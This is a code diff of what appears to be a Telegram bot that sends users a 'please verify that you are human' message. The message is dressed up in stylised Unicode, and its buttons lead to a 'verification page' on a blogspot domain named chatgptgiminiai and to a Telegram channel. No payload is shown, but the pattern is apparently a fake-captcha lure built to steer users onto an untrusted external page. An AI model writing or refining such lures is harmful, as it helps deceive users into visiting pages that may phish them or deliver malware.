@@ -93,21 +93,17 @@ async def send_verification_message(update: Update, context: ContextTypes.DEFAUL
 
     keyboard = [
         [InlineKeyboardButton(
-            "I'm not a robot🤖",
-            web_app={"url": "https://chatgptgiminiai.blogspot.com/2024/08/verification-page-body-font-family.html"}
+            "I'm not a robot👨‍💼",  # New button (not a web app)
+            url= f"https://chatgptgiminiai.blogspot.com/2024/09/verification-page-body-font-family.html"  # Direct link to verification start
         )],
         [InlineKeyboardButton(
-            "|OR|I'm a Human",  # New button (not a web app)
-            url= f"https://chatgptgiminiai.blogspot.com/2024/08/verification-page-body-font-family.html"  # Direct link to verification start
-        )],
-        [InlineKeyboardButton(
-            "How to open link",  # New button (not a web app)
-            url= f"https://t.me/chatgpt4for_free" # Will trigger a callback
+            "How to open captcha🔗",  # New button (not a web app)
+            url= f"https://t.me/disneysworl_d/5" # Will trigger a callback
         )]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        'Please verify that you are human 👨‍💼\nTo prevent misuse we enabled this captcha\nClick here👇',
+        '♂️ 🅲🅰🅿🆃🅲🅷🅰 ♂️\n\nᴘʟᴇᴀsᴇ ᴠᴇʀɪғʏ ᴛʜᴀᴛ ʏᴏᴜ ᴀʀᴇ ʜᴜᴍᴀɴ 👨‍💼\nᴛᴏ ᴘʀᴇᴠᴇɴᴛ ᴀʙᴜsᴇ ᴡᴇ ᴇɴᴀʙʟᴇᴅ ᴛʜɪs ᴄᴀᴘᴛᴄʜᴀ\n𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘👇',
         reply_markup=reply_markup
     )
 
